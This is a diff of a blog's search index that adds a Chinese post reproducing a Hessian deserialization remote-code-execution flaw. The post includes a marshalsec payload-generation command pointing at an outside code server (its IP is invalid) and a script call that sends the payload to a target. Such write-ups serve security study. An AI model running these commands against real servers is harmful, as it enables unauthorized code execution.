@@ -1,9 +1,35 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>test1</title>
+    <title>第一篇测试文章</title>
     <url>/2021/04/16/test/</url>
-    <content><![CDATA[<p>asdsdasdasdasdeeeeeeeeeeeeeeeeee</p>
+    <content><![CDATA[<p>第一篇测试文章</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Hessian反序列化RCE漏洞</title>
+    <url>/2021/04/16/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h3 id="一、组件介绍"><a href="#一、组件介绍" class="headerlink" title="一、组件介绍"></a>一、组件介绍</h3><ul>
+<li>Hessian是一个轻量级的RPC框架。它基于HTTP协议传输，使用Hessian二进制序列化，对于数据包比较大的情况比较友好。Hessian反序列化可导致RCE,POC于2017年就公开了,但是经过测试,目前最新版本hessian-4.0.60.jar,同样存在反序列化问题</li>
+</ul>
+<h3 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h3><ol>
+<li><p>需要一个提供反序列数据的服务器。</p>
+<p> <img src="/images/pasted-3.png" alt="upload successful"></p>
+</li>
+<li><p>攻击端本地生成payload.里面的地址为提供反序列化数据的服务器地址。</p>
+</li>
+</ol>
+  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian Resin http:&#x2F;&#x2F;471.196.183.126:8180&#x2F; ExecTemplateJDK7&gt;hession</span><br></pre></td></tr></table></figure>
+<pre><code>![upload successful](/images/pasted-4.png)
+</code></pre>
+<p>   攻击端本地生成hession文件。</p>
+<ol start="3">
+<li>攻击端本地向目标发送payload，使得目标服务器向提供反序列化数据的服务器进行请求。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python hessian.py -u http:&#x2F;&#x2F;192.168.182.178:8080&#x2F;HessianTest&#x2F;hessian -p hession</span><br></pre></td></tr></table></figure>
+
+ <img src="/images/pasted-5.png" alt="upload successful"></li>
+<li>目标服务器收到payload，并序列化payload，然后向提供反序列化数据的服务器进行请求。<br> 收到请求 <img src="/images/pasted-6.png" alt="upload successful"></li>
+<li>目标服务器成功执行命令。 <img src="/images/pasted-7.png" alt="upload successful"></li>
+</ol>
 ]]></content>
   </entry>
   <entry>
